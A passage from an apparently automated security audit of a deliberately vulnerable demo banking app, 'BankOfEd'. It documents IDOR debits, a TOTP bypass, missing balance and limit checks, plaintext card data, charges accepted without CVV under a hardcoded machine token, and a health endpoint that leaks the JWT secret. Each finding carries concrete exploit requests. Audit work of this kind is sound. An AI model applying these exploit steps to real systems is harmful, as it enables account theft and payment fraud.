Confirmed authenticated IDOR on POST /api/transfers/external. The caller-supplied from_account_id is taken from the JSON body in TransactionController::transferExternal and passed unchanged into TransferService::transferExternal. That service loads the source account with Account::findById() (SELECT * FROM accounts WHERE id = ?) and never compares accounts.user_id to the authenticated user. It then unconditionally debits via Account::updateBalance($fromAccountId, '-' . $debitAmount). transferOwn() in the same class uses findByIdAndUser, proving the ownership control exists and is simply omitted here. Destination is attacker-controlled (own address-book entry, which is correctly scoped, or manual BSB/account); if that destination is an in-bank account it is credited. Account IDs are sequential AUTO_INCREMENT (seed comments even document IDs 1–25 across customers), so they are enumerable. AuthMiddleware only requires any Bearer token; TOTP is required for manual transfers but is skipped when totp_enabled is false or totp_code is omitted. There is also no balance or is_active check on this path, so a victim account can be driven arbitrarily negative. No remaining control blocks the debit of another customer's account.

#### Code evidence

```
// VULNERABILITY #23: IDOR - no ownership check on source account.
$fromAccount = Account::findById($fromAccountId);
Account::updateBalance($fromAccountId, '-' . $debitAmount);
Contrast: transferOwn uses Account::findByIdAndUser($fromAccountId, $userId).
```

## 58. External transfers skip TOTP even when 2FA is required

- Lead reference: ENCX-058
- Category: A07
- Severity: HIGH
- Confidence: 96%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Services/TransferService.php:241
- Fingerprint: b66b1ed2c80bf33a7c765844ebe0bfb9868b6c8c6848b5682bdf932a26ba6310

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/TransactionController.php",
  "line": 118,
  "symbol": "$data['totp_code']",
  "input": "body.totp_code"
}
```

#### Controls encountered

```
[
  "AuthMiddleware requires a Bearer JWT (first factor only; login never challenges TOTP)",
  "TransferService::checkTotpRequired correctly flags manual and unverified address-book transfers as required, but the result is advisory",
  "TotpService::verify is invoked only when totp_enabled is true AND totp_code is non-empty; invalid supplied codes are rejected via Response::forbidden",
  "SPA transfers.js blocks unconfigured TOTP and empty codes after /api/transfers/check, but this is client-side and not applied to the API",
  "totp_verified is persisted on the transaction and used only to mark an address-book payee verified; it does not gate completion or the debit"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Services/TransferService.php",
  "line": 241,
  "symbol": "TotpService::verify",
  "operation": "mfa_verify"
}
```

#### Counterevidence

```
[
  "Own-account transfers and verified address-book payees are intentionally TOTP-exempt via checkTotpRequired; that exemption is not this bug",
  "Users with totp_enabled=false never enrolled a second factor; the stronger, unambiguous bypass is totp_enabled=true with totp_code omitted. The unenrolled path is still a policy fail-open because the product UI and check endpoint treat those transfers as requiring TOTP setup before submit."
]
```

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Attacker with a stolen or forged customer JWT",
    "POST /api/transfers/external to a new manual/unverified payee, omitting totp_code (optional field, no validator rule)",
    "checkTotpRequired correctly flags required=true for manual/unverified payees",
    "Enforcement block fail-open: totp_enabled false continues; totp_enabled true but empty totp_code skips TotpService::verify",
    "Account::updateBalance and Transaction::create status=completed still run; totp_verified is only a stored flag"
  ],
  "impact": "Claimed TOTP step-up on external transfers is not enforced; a session thief can send money to a new payee without the second factor.",
  "severity_reasoning": "SPA blocks empty codes client-side only. Backend proceeds whenever the code is omitted even if totp_enabled is true. Concrete 2FA bypass on a fund-moving API. High.",
  "dynamic_test": "Enable TOTP on a user. POST /api/transfers/external as that user with a new manual to_bsb/to_account_number and no totp_code. Confirm the transfer completes (200, status completed) rather than TOTP_INVALID. Supplying a wrong code should still 403, proving verify only runs when a code is present."
}
```

#### Validator reasoning

Confirmed 2FA fail-open on POST /api/transfers/external. TransactionController::transferExternal passes body.totp_code through as an optional field (no validation rule) into TransferService::transferExternal. checkTotpRequired() correctly marks manual entries and unverified address-book payees as required=true, but that result is never used to abort.

The enforcement block at TransferService.php:235-247 is fail-open:
1) If totp_enabled is false, totpVerified is set false and execution continues.
2) If totp_enabled is true, TotpService::verify() runs only inside elseif (!empty($totpCode)). Omitting totp_code skips verification entirely; there is no else that rejects.
3) Response::forbidden('TOTP_INVALID') fires only when a code is supplied and is wrong.

Immediately after this block the debit proceeds: Account::updateBalance($fromAccountId, '-' . $debitAmount) and Transaction::create(..., 'status' => 'completed'). totp_verified is stored as a flag only; it does not hold, queue, or reverse the transfer. Address-book payees are marked verified only when totpVerified is true, so an unverified payee remains unverified and the same bypass can be repeated.

The SPA (transfers.js) does refuse unconfigured TOTP and empty codes after /api/transfers/check, but that is client-side only. Direct API call with a valid session JWT (AuthMiddleware is first-factor only; login never prompts TOTP) completes a manual external debit with no totp_code. Product policy is explicit: checkTotpRequired + the check endpoint + the UI warning that disables submit all treat these transfers as TOTP-required. The backend does not enforce that policy. This is a concrete session-theft 2FA bypass on money movement.

#### Code evidence

```
// VULNERABILITY #8: TOTP Bypass — if TOTP is required but not configured, transfer proceeds anyway.
// Additionally, if configured but code is omitted, transfer still succeeds.
if ($totpCheck['required']) {
  if (!$user['totp_enabled']) { $totpVerified = false; }
  elseif (!empty($totpCode)) { TotpService::verify(...); }
}
No else branch rejects missing codes.
```

## 59. External transfers have no source-balance check

- Lead reference: ENCX-059
- Category: A04
- Severity: HIGH
- Confidence: 95%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Services/TransferService.php:212
- Fingerprint: e9cd7cc03368c4aa13eebd78f802b8c49f5f2cb924bef5a0f0ebc8809a8d58e0

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/TransactionController.php",
  "line": 116,
  "symbol": "$data['amount']",
  "input": "body.amount"
}
```

#### Controls encountered

```
[
  "POST /api/transfers/external requires JWT auth",
  "Amount must be decimal:2 and > 0",
  "transferOwn has an insufficient-funds check for transaction/fx accounts (not applied here)",
  "TOTP may be required for address_book/manual but is bypassed when totp_enabled is false or totp_code is omitted"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Services/TransferService.php",
  "line": 269,
  "symbol": "Account::updateBalance",
  "operation": "balance_update"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Authenticated POST /api/transfers/external with amount > source balance (decimal:2 > 0 only)",
    "TransferService::transferExternal never compares balance (VULNERABILITY #9 comment)",
    "Account::updateBalance UPDATE accounts SET balance = balance + ? with negative debit; schema DECIMAL(15,2) signed, no CHECK",
    "If destination is internal, second updateBalance credits that account, minting spendable funds"
  ],
  "impact": "Unlimited overdraft on the source account and creation of spendable funds at an internal payee; combined with source IDOR, also infinitely overdrafts other customers.",
  "severity_reasoning": "transferOwn has an insufficient-funds guard for transaction/fx; this path has none. Amount has no maximum. High business-logic fraud.",
  "dynamic_test": "As a user with a low-balance transaction account, POST /api/transfers/external amount 1000000.00 to an internal destination you own. Confirm source goes largely negative and destination increases by 1,000,000. Repeat with a victim from_account_id to show IDOR+overdraft."
}
```

#### Validator reasoning

Authenticated POST /api/transfers/external reaches TransferService::transferExternal, which never compares source balance to the debit amount (explicit VULNERABILITY #9 comment). The only amount controls are decimal:2 and > 0 in TransactionController. Account::updateBalance then executes UPDATE accounts SET balance = balance + ? with a negative debit; schema.sql defines accounts.balance as signed DECIMAL(15,2) with no CHECK/UNSIGNED constraint. transferOwn does refuse overdrafts for transaction/fx accounts, but that guard is not on this path. TOTP is not a blocking control: if it is required but unset, or set but omitted, the transfer still completes. Destination can be an in-bank account (credit applied) or a fully external payee, so an attacker can create unlimited overdrafts and move value. Combined with findById (no ownership) this also overdrafts other customers, but the missing funds check is independently exploitable on the attacker’s own accounts.

#### Code evidence

```
// VULNERABILITY #9: No balance check on external transfers — removed to allow unlimited overdraft
Account::updateBalance($fromAccountId, '-' . $debitAmount);
Contrast transferOwn: if (in_array($fromAccount['account_type'], ['transaction', 'fx']) && round((float)$fromAccount['balance'], 2) < round((float)$debitAmount, 2)) insufficient funds.
```

## 60. IDOR: any user can debit another customer's account via external transfer

- Lead reference: ENCX-060
- Category: A01
- Severity: HIGH
- Confidence: 97%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Models/Account.php:95
- Fingerprint: a7859061829fc68f189e24d5cabecd0adafa6fbae8846902bfd50c8ec51346b7

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/TransactionController.php",
  "line": 111,
  "symbol": "transferExternal",
  "input": "from_account_id"
}
```

#### Controls encountered

```
[
  "JWT AuthMiddleware on POST /api/transfers/external (authentication only, not object-level authorization)",
  "AddressBookEntry::findByIdAndUser scopes address_book_id, but is bypassable via the manual to_bsb/to_account_number path",
  "transferOwn correctly uses Account::findByIdAndUser; that control is not applied on the external path"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Models/Account.php",
  "line": 95,
  "symbol": "Account::updateBalance",
  "operation": "UPDATE accounts SET balance = balance + ? WHERE id = ?"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "JWT-authenticated POST /api/transfers/external {from_account_id, to_bsb, to_account_number, amount}",
    "from_account_id is int-cast and passed to TransferService::transferExternal",
    "Account::findById (no user_id) then Account::updateBalance debit on that id",
    "Manual destination BSB/account resolves via findByBsbAndNumber and is credited if internal (e.g. attacker account or FACE Insurance id 100)"
  ],
  "impact": "IDOR debit of any bank account including the seeded FACE Insurance $100,000,000 settlements account, with stolen funds credited to the attacker.",
  "severity_reasoning": "Complete money-moving BOLA. Address-book scoping is bypassed by omitting address_book_id. TOTP skippable. High.",
  "dynamic_test": "POST /api/transfers/external as any user with from_account_id=100 (FACE Insurance) or another customer's id, destination = attacker's BSB/account, omit totp_code. Confirm source debit and attacker credit."
}
```

#### Validator reasoning

POST /api/transfers/external is JWT-authenticated only. TransactionController::transferExternal takes caller-controlled from_account_id, casts it to int, and passes it to TransferService::transferExternal with no ownership check. TransferService loads the source with Account::findById (WHERE id = ?) instead of findByIdAndUser, which transferOwn uses correctly. There is no user_id predicate, no is_active check, and no balance check. Account::updateBalance then runs UPDATE accounts SET balance = balance + ? WHERE id = ? against that id, debiting any account including other customers and seeded FACE Insurance settlements account id 100 ($100,000,000). Destination BSB/account number is also caller-controlled on the manual path; Account::findByBsbAndNumber resolves internal payees and credits them, so an attacker can move funds onto their own Bank of Ed account. Address-book scoping does not block this because the manual branch is taken when address_book_id is omitted. TOTP is skippable when totp_code is omitted even if required. Concrete path: JWT -> POST /api/transfers/external {from_account_id, to_bsb, to_account_number, amount} -> TransferService::transferExternal -> Account::findById -> Account::updateBalance debit/credit.

#### Code evidence

```
// VULNERABILITY #23: IDOR - no ownership check on source account.
        // Any authenticated user can supply any account ID as the source.
        $fromAccount = Account::findById($fromAccountId);

        ...
            Account::updateBalance($fromAccountId, '-' . $debitAmount);

            // Credit if internal
            if ($toAccountId !== null) {
                Account::updateBalance($toAccountId, $creditAmount);
            }
```

## 61. External transfers debit accounts with no available-balance check

- Lead reference: ENCX-061
- Category: A04
- Severity: HIGH
- Confidence: 96%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Models/Account.php:95
- Fingerprint: 6e257221462f75b9cb4a1e0659e4afb2a8e251e56d02daba2f903b7818e95f07

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/TransactionController.php",
  "line": 116,
  "symbol": "transferExternal",
  "input": "amount"
}
```

#### Controls encountered

```
[
  "POST /api/transfers/external requires authentication",
  "amount must match decimal:2 and be > 0",
  "transferOwn (different endpoint) checks balance only for transaction/fx sources"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Models/Account.php",
  "line": 95,
  "symbol": "Account::updateBalance",
  "operation": "UPDATE accounts SET balance = balance + ? WHERE id = ?"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Authenticated POST /api/transfers/external with attacker-chosen amount larger than source balance",
    "No available-balance or credit-limit comparison in transferExternal",
    "Account::updateBalance unconstrained balance = balance + ?; no CHECK on accounts.balance",
    "Internal destination credited the same amount, minting spendable funds"
  ],
  "impact": "Unlimited overdraft and internal fund minting on the attacker’s own (or, via IDOR, any) account.",
  "severity_reasoning": "Explicitly removed check. Distinct from ownership IDOR: even with a correct from_account_id the overdraft succeeds. High.",
  "dynamic_test": "POST /api/transfers/external from the attacker’s own transaction account with amount far above balance to another own internal account. Confirm negative source balance and increased destination. Also try a credit_card source via POST /api/transfers/own to show transferOwn skips the guard for that type."
}
```

#### Validator reasoning

Confirmed source-to-sink with no effective blocking control. POST /api/transfers/external is an authenticated route that accepts a user-controlled positive decimal amount and passes it to TransferService::transferExternal. That method loads the source via Account::findById (no ownership, no is_active check) and then, after an explicit “VULNERABILITY #9: No balance check on external transfers” comment, never compares source balance (or credit_limit) to $debitAmount. It immediately calls Account::updateBalance($fromAccountId, '-' . $debitAmount), whose SQL is unconstrained `UPDATE accounts SET balance = balance + ? WHERE id = ?`. The accounts.balance column is DECIMAL(15,2) with no CHECK/trigger, so the debit can drive the row arbitrarily negative. If the destination BSB+account number resolves internally, the same amount is credited via a second updateBalance, minting spendable funds (including to another of the attacker’s own accounts, which transferOwn would have blocked for transaction/fx sources). Validator::decimal:2 and the >0 check only constrain format/sign, not magnitude. TOTP is not a balance control and is bypassable when unset or omitted. transferOwn’s insufficient-funds guard is limited to account_type in {transaction, fx} and is not invoked on this path. Exploit: authenticated POST /api/transfers/external with amount larger than source balance to an internal destination the attacker controls.

#### Code evidence

```
// VULNERABILITY #9: No balance check on external transfers — removed to allow unlimited overdraft

        // Determine transfer type and resolve payee details
        if ($addressBookId !== null) {
            $transferType = 'address_book';
            ...
        Database::beginTransaction();
        try {
            Account::updateBalance($fromAccountId, '-' . $debitAmount);

            // Credit if internal
            if ($toAccountId !== null) {
                Account::updateBalance($toAccountId, $creditAmount);
            }
```

## 62. Self-service credit-card limit and loan amount have no upper bound

- Lead reference: ENCX-062
- Category: A04
- Severity: HIGH
- Confidence: 88%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Models/Account.php:75
- Fingerprint: 0294cf583c04474d9146f7e62243afd21215f4da7fc92b9e9b2f947a18419b40

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/AccountController.php",
  "line": 48,
  "symbol": "store",
  "input": "credit_limit / borrow_amount"
}
```

#### Controls encountered

```
[
  "JWT required (any registered user; POST /api/auth/register is public)",
  "account_type allowlist includes credit_card and loan",
  "credit_limit must be numeric and > 0 (no maximum)",
  "borrow_amount must be required|numeric|decimal:2 and > 0 (no maximum)",
  "loan disbursement_account_id must belong to the caller and be account_type=transaction",
  "frontend credit_limit min=100 / default 25000 is client-only and not enforced by the API",
  "accounts.balance and credit_limit are DECIMAL(15,2) (~10^13 cap, not a policy max)"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Models/Account.php",
  "line": 75,
  "symbol": "Account::create",
  "operation": "INSERT INTO accounts (... balance, ... credit_limit)"
}
```

#### Counterevidence

```
[
  "README and UI present user-chosen credit limits with instant approval as product behavior (default $25,000)",
  "this path is not annotated as a planted VULNERABILITY unlike TransferService overdraft/TOTP/IDOR comments",
  "TransferService::transferExternal already skips balance checks (commented VULNERABILITY #9), so unbounded overdraft is a parallel money-creation path",
  "credit_card/loan sources also skip the transferOwn insufficient-funds check, so even a default $25k card can be drained beyond its posted limit via own transfers"
]
```

#### Proof gaps

```
[
  "Not dynamically executed against a live DB, so DECIMAL(15,2) STRICT sql_mode overflow/clipping for values beyond 9999999999999.99 was not empirically observed",
  "Did not confirm a specific merchant/seeded payee is required to spend a credit card versus transferring to a newly opened own transaction account"
]
```

#### Attack path

```
{
  "nodes": [
    "Public register then JWT POST /api/accounts account_type=credit_card with arbitrary credit_limit (numeric > 0, no max) or account_type=loan with arbitrary borrow_amount (decimal:2 > 0)",
    "Account::create writes credit_limit as opening balance, or loan path updateBalance credits a caller-owned transaction account",
    "No KYC, approval, product cap, or per-user issuance limit",
    "Spend via transferOwn/transferExternal or PaymentController::process"
  ],
  "impact": "Self-service money creation up to DECIMAL(15,2) (~10^13): unbounded credit-card opening balance or instant loan disbursement into a spendable transaction account.",
  "severity_reasoning": "Frontend min/default is client-only. Validator has no max rule. Instant issuance is demo UX, but the missing upper bound is a concrete fraud path for any registered user. High; confidence slightly lower because product copy advertises user-chosen limits.",
  "dynamic_test": "POST /api/accounts {\"account_type\":\"credit_card\",\"account_name\":\"x\",\"credit_limit\":\"999999999.00\"} and confirm returned balance/credit_limit. Then POST loan with borrow_amount 1000000.00 and disbursement_account_id of a $0 transaction account; confirm that account is credited 1,000,000."
}
```

#### Validator reasoning

POST /api/accounts (AccountController::store) is reachable by any JWT user, and registration is public. For account_type=credit_card, credit_limit is validated only as numeric and > 0 (no max, no decimal-places cap, scientific notation accepted). That value is assigned to both $creditLimit and $initialBalance and written through Account::create as accounts.balance and accounts.credit_limit. Omitting the field defaults to 25000, which does not constrain a supplied value. The issued card (number/expiry/CVV) is returned in Account::toPublic.

Those funds are spendable: PaymentController::process treats credit-card balance as available credit and will charge a merchant up to that amount; TransferService::transferOwn also accepts a credit_card source with no account-type restriction, so the opening balance can be moved onto a transaction account.

For account_type=loan, borrow_amount is required|numeric|decimal:2 and only additionally checked > 0. After Account::create (loan opens at 0.00), store immediately does Account::updateBalance(loan, -amount) and Account::updateBalance(own transaction account, +amount) inside a DB transaction, with a completed 'Loan proceeds disbursement' row. disbursement_account_id must belong to the caller and be a transaction account — that is a destination constraint, not an amount/approval control. A new user can first open a $0 transaction account, then a loan of arbitrary size, then transfer the credited balance.

Validator::make has no max/min numeric range rule; the HTML min=100 on credit_limit is client-only and not enforced by the API. There is no KYC, underwriting, admin approval, product-cap setting, or per-user issuance limit anywhere in store, Account, Setting, or schema. The only practical ceiling is DECIMAL(15,2) (~9.99e12), which is a column width, not a security control. Instant self-service issuance is clearly intended as a demo product, but the missing upper bound still yields a concrete, unauthenticated-to-the-bank money-creation path for any registered user.

#### Code evidence

```
if (isset($data['credit_limit']) && trim((string)$data['credit_limit']) !== '') {
                $limitErrors = Validator::make($data, [
                    'credit_limit' => 'numeric',
                ]);
                ...
                    $creditLimit = (float)$data['credit_limit'];
            ...
            $initialBalance = $creditLimit;
        ...
            } elseif ((float)$data['borrow_amount'] <= 0) {
                $errors['borrow_amount'][] = 'The borrow_amount field must be greater than 0.';
            }
        ...
            $accountId = Account::create([
                ...
                'balance'        => $initialBalance,
                ...
                'credit_limit'   => $creditLimit,
            ]);

            if ($data['account_type'] === 'loan') {
                $borrowAmount = number_format((float)$data['borrow_amount'], 2, '.', '');

                Account::updateBalance($accountId, '-' . $borrowAmount);
                Account::updateBalance((int)$destination['id'], $borrowAmount);
```

## 63. Full PAN and CVV stored in plaintext and returned by account APIs

- Lead reference: ENCX-063
- Category: A02
- Severity: MEDIUM
- Confidence: 93%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Models/Account.php:75
- Fingerprint: 0c2817641491ec5e9e02e01fc14e05beeffc8aff246ee4a3b955576b19f528f0

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/AccountController.php",
  "line": 54,
  "symbol": "store",
  "input": "generated card_number/card_expiry/card_cvv"
}
```

#### Controls encountered

```
[
  "JWT AuthMiddleware on GET/POST /api/accounts (owner-scoped findByUser / findByIdAndUser)",
  "Account::toPublic only attaches card fields when account_type is credit_card",
  "Payment process endpoint requires a machine bearer token (not the user JWT)"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Models/Account.php",
  "line": 75,
  "symbol": "Account::create",
  "operation": "INSERT card_number, card_expiry, card_cvv plaintext"
}
```

#### Counterevidence

```
[
  "Returning virtual-card details to the authenticated cardholder is also product UX (accounts.js card widget), not an unauthenticated leak or IDOR.",
  "Payment charging still requires a machine token in addition to the stolen JWT; CVV is optional on that API so CVV disclosure is not strictly required to spend."
]
```

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "POST /api/accounts credit_card generates PAN/expiry/CVV via AccountService and Account::create INSERTs plaintext card_number, card_expiry, card_cvv",
    "GET /api/accounts and GET /api/accounts/{id} SELECT * then Account::toPublic copies full PAN, expiry, CVV into JSON when account_type is credit_card",
    "JWT in localStorage; XSS or stolen session yields SAD",
    "POST /api/payments/process consumes PAN+expiry (CVV optional) under the default machine token"
  ],
  "impact": "PCI-DSS SAD stored and returned in full: stolen JWT/XSS yields immediately usable card-not-present PAN, expiry, and CVV.",
  "severity_reasoning": "No encryption, tokenization, or masking at the API. CVV storage after issuance is forbidden by PCI DSS 3.2. Medium because index/show are owner-scoped (not an unauthenticated leak) but the disclosure is unambiguous.",
  "dynamic_test": "Open a credit_card via POST /api/accounts then GET /api/accounts. Confirm JSON contains full card_number, card_expiry, and card_cvv (not last4). Optionally POST /api/payments/process with those values and the default machine token."
}
```

#### Validator reasoning

Concrete source-to-sink path with no effective blocking control.

Source: AccountController::store (POST /api/accounts, JWT) generates a Luhn-valid PAN, MM/YY expiry, and 3-digit CVV via AccountService and passes them to Account::create. Seeded cards in install/seed.sql also insert full PAN/CVV in plaintext (e.g. 4532015001345674 / 08/29 / 842).

Storage sink: Account::create executes an unencrypted INSERT into accounts.card_number VARCHAR(19), card_expiry VARCHAR(5), card_cvv VARCHAR(4). schema.sql defines no encryption, and Database.php is a raw PDO wrapper with no field-level crypto, tokenization, or hashing of card data.

Disclosure sink: GET /api/accounts (AccountController::index) and GET /api/accounts/{id} (show) load SELECT * via findByUser / findByIdAndUser, then Account::toPublic copies the full card_number, card_expiry, and card_cvv into the JSON whenever account_type === 'credit_card'. The banking UI (accounts.js) renders those fields unmasked. JWT is stored in localStorage as bankofed_token, so XSS or token theft yields the SAD.

Downstream use: PaymentController::process looks up the stored PAN, compares expiry, and (only if a CVV is supplied) compares against the stored card_cvv. CVV is not required. The machine-token gate uses a committed default secret, so stolen account-API output is immediately usable as card-not-present data.

JWT ownership checks and the credit_card-only branch in toPublic do not encrypt, mask, truncate, or omit SAD. PCI DSS forbids storing CVV after authorization (issuers must at least encrypt SAD) and requires PAN to be unreadable at rest; neither control exists.

#### Code evidence

```
$stmt = $db->prepare(
            'INSERT INTO accounts (user_id, bsb, account_number, account_type, account_name, currency, balance, card_number, card_expiry, card_cvv, credit_limit) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)'
        );
        $stmt->execute([
            ...
            $data['card_number'] ?? null,
            $data['card_expiry'] ?? null,
            $data['card_cvv'] ?? null,
            ...
        ]);
        ...
        if ($account['account_type'] === 'credit_card') {
            $data['card_number']  = $account['card_number'] ?? null;
            $data['card_expiry']  = $account['card_expiry'] ?? null;
            $data['card_cvv']     = $account['card_cvv'] ?? null;
            $data['credit_limit'] = $account['credit_limit'] ?? '25000.00';
        }
```

## 64. Card payment API accepts charges without CVV

- Lead reference: ENCX-064
- Category: A04
- Severity: HIGH
- Confidence: 95%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Models/Account.php:64
- Fingerprint: 37da5434f7c46d61cbceb986bb185c79c264adf4c705a03329446f5b4edbe07a

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/PaymentController.php",
  "line": 22,
  "symbol": "process",
  "input": "card_number, expiry, optional cvv"
}
```

#### Controls encountered

```
[
  "MachineAuthMiddleware Bearer token (seeded hash of mch_face_insurance_secret_key_2026 plus config fallback of the same hardcoded value)",
  "Luhn check on PAN (AccountService::validateLuhn)",
  "Expiry format, not-expired, and stored-expiry match when card_expiry is present",
  "Available-credit comparison before debit"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Models/Account.php",
  "line": 64,
  "symbol": "Account::findByCardNumber",
  "operation": "SELECT * FROM accounts WHERE card_number = ?"
}
```

#### Counterevidence

```
[
  "process() is behind machine-token auth rather than being fully public; the token is nonetheless a known default/seeded secret, so the control does not stop an unauthenticated attacker with the published key.",
  "Stored CVV is compared when the client actually sends cvv/cvc; that does not constrain the omit-the-field bypass."
]
```

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Unauthenticated attacker uses Bearer mch_face_insurance_secret_key_2026",
    "POST /api/payments/process JSON merchant_id, card_number, expiry, amount — cvv omitted (validator does not require it)",
    "Account::findByCardNumber loads the card; CVV compared only if inputCvv !== ''",
    "Luhn/expiry/available-credit pass for seeded cards (public PAN+expiry, $25k credit)",
    "Account::updateBalance debits the cardholder and credits the merchant"
  ],
  "impact": "Card-not-present charges against any known PAN (including all seeded credit cards) without CVV, using the published machine token.",
  "severity_reasoning": "Optional CVV is a complete skip, not a failed comparison. Seeded PANs/expiries are in seed.sql; new cards use deterministic +3 year expiry. High payment-fraud path.",
  "dynamic_test": "POST /api/payments/process with the default machine token, merchant_id faceinsurance, seeded PAN 4532015001345674 and expiry 08/29, amount 10.00, no cvv. Confirm 200 and card/merchant balances change. Repeat sending a wrong cvv to show that only a supplied wrong value is declined."
}
```

#### Validator reasoning

POST /api/payments/process is a live, reachable handler (Router.php, auth=machine). Request JSON is taken from php://input with Validator rules that require merchant_id, card_number, expiry, and amount only — cvv/cvc is not required.

The card is loaded by PAN via Account::findByCardNumber. CVV comparison is gated on both a stored CVV and a non-empty client CVV:

$inputCvv = trim($data['cvv'] ?? $data['cvc'] ?? '');
if (!empty($cardAccount['card_cvv']) && $inputCvv !== '') { ... }

Omitting cvv/cvc sets $inputCvv to '' so the block is skipped. Control then continues to the available-credit check and Account::updateBalance debit of the cardholder plus credit of the merchant. PaymentController::process never uses $auth, so there is no merchant-token binding.

Machine auth does not block an outsider: MachineToken::validateToken accepts SHA-256 of the seeded secret mch_face_insurance_secret_key_2026 (install/seed.sql) and also falls back to config/app.php's hardcoded default of the same value. That secret is additionally hardcoded in tests, AdminSystemController, and the admin UI. Docker init always loads seed.sql.

Seeded credit cards publish PAN + expiry (and even CVV) in seed.sql, each with $25,000 available credit, and merchant_id faceinsurance is seeded. Newly issued cards always get expiry date('m/y', strtotime('+3 years')), so PAN + that expiry is enough. Luhn and expiry matching do not restore a CVV check. This is a concrete charge-any-known-card path with no effective blocking control.

#### Code evidence

```
$cardAccount = Account::findByCardNumber($cleanCard);
        ...
        // 5. Validate CVV/CVC if provided
        $inputCvv = trim($data['cvv'] ?? $data['cvc'] ?? '');
        if (!empty($cardAccount['card_cvv']) && $inputCvv !== '') {
            if ($inputCvv !== $cardAccount['card_cvv']) {
                Response::error('PAYMENT_DECLINED', 'Payment declined. Please check your card details and try again.', 400);
            }
        }
        ...
            Account::updateBalance((int)$cardAccount['id'], '-' . $amount);
            Account::updateBalance((int)$merchant['account_id'], $amount);
```

## 65. Unauthenticated /api/health leaks JWT secret and database credentials — Health route is explicitly registered with auth => false.

- Lead reference: ENCX-065
- Category: A02
- Severity: HIGH
- Confidence: 95%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Router.php:25
- Fingerprint: 2a46268dc110177838dacaef1bd42bb575cee0132c585a2655e020e343a24fd8

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Router.php",
  "line": 87,
  "symbol": "health",
  "input": "unauthenticated GET /api/health"
}
```

#### Controls encountered

No controls recorded

#### Sink

```
{
  "file": "BankOfEd-main/src/Router.php",
  "line": 32,
  "symbol": "Response::success",
  "operation": "json_encode config including jwt_secret"
}
```

#### Counterevidence

```
[
  "Health response includes db_host/db_name/db_user but not db_pass, so full database credentials are not dumped.",
  "AuthService::decodeToken() does not verify HS256 signatures, so forging customer JWTs does not require the leaked jwt_secret."
]
```

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "GET /api/health is explicitly registered in Router with auth => false — that registration is the distinct root cause",
    "dispatch() therefore never calls AuthMiddleware for this path",
    "health() returns live jwt_secret and DB identity via Response::success"
  ],
  "impact": "Unauthenticated recovery of HS256 signing secret and database identity.",
  "severity_reasoning": "High: the route flag is the control failure that publishes production secrets. Distinct from decodeToken's missing verify: even a correct verifier is undermined by leaking the key.",
  "dynamic_test": "Unauthenticated GET /api/health. Confirm 200 and presence of jwt_secret/db_*. Contrast with GET /api/profile (auth => true) which must 401 without a token, proving only health is explicitly public."
}
```

#### Validator reasoning

GET /api/health is a live, reachable FastRoute handler with auth explicitly set to false. Router::dispatch() only invokes AuthMiddleware when the route's auth flag is true (or MachineAuthMiddleware when it is 'machine'); a false flag skips all authentication. The handler loads config/app.php and json-encodes jwt_secret, db_host, db_name, and db_user via Response::success with no filtering, env gate, or IP allowlist. public/index.php forwards every /api/* request (except /api/admin/*) into this dispatcher, and public/.htaccess plus the Docker Apache config impose no extra restriction. jwt_secret is the HS256 key used by AuthService::createToken, defaulting to 'bankofed-dev-secret-change-in-production' when JWT_SECRET is unset. This is a concrete unauthenticated source-to-sink leak of a cryptographic secret (plus database identity). db_pass is not returned, and customer JWT verification currently ignores signatures, so forging tokens does not strictly require this leak — but the secret disclosure itself is unblocked and exploitable.

#### Code evidence

```
public static function health(): void
{
    $config = require __DIR__ . '/../config/app.php';
    Response::success([
        'status'      => 'ok',
        'php_version' => PHP_VERSION,
        'server'      => $_SERVER['SERVER_SOFTWARE'] ?? 'unknown',
        'db_host'     => $config['db_host'],
        'db_name'     => $config['db_name'],
        'db_user'     => $config['db_user'],
        'jwt_secret'  => $config['jwt_secret'],
        'environment' => getenv('APP_ENV') ?: 'production',
    ]);
}
// route: $r->addRoute('GET', '/api/health', ['handler' => [self::class, 'health'], 'auth' => false]);

public static function health(): void
{
    $config = require __DIR__ . '/../config/app.php';
    Response::success([
        'status'      => 'ok',
        'php_version' => PHP_VERSION,
        'server'      => $_SERVER['SERVER_SOFTWARE'] ?? 'unknown',
        'db_host'     => $config['db_host'],
        'db_name'     => $config['db_name'],
        'db_user'     => $config['db_user'],
